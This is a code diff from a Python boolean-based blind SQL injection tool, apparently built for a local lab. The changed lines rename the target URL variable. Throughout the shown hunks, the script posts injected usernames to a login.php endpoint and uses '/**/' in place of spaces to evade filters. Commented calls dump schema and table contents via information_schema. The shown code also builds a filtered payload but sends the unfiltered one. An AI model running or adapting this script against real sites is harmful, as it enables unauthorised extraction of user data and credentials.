@@ -4,7 +4,7 @@ def is_correct_char(index, char, base_query, row_offset):
     # Replace space with /**/
     final_payload = payload.replace(" ", "/**/")
     try:
-        response = session.post(TARGET + "/login.php", data={"username": payload, "password": ""})
+        response = session.post(f"{base_url}/login.php", data={"username": payload, "password": ""})
         # True Condition
         return "Wrong identification" in response.text
     except:
@@ -74,8 +74,7 @@ def dump_entire_table(table_name):
         structured_data.append(dict(zip(columns, row.split(':'))))
     return structured_data
 
-global TARGET
-TARGET = "http://127.0.0.1"
+base_url = "http://127.0.0.1"
 
 # print(dump_data("SELECT table_name FROM information_schema.tables"))
 # print(get_columns_for_table("users"))
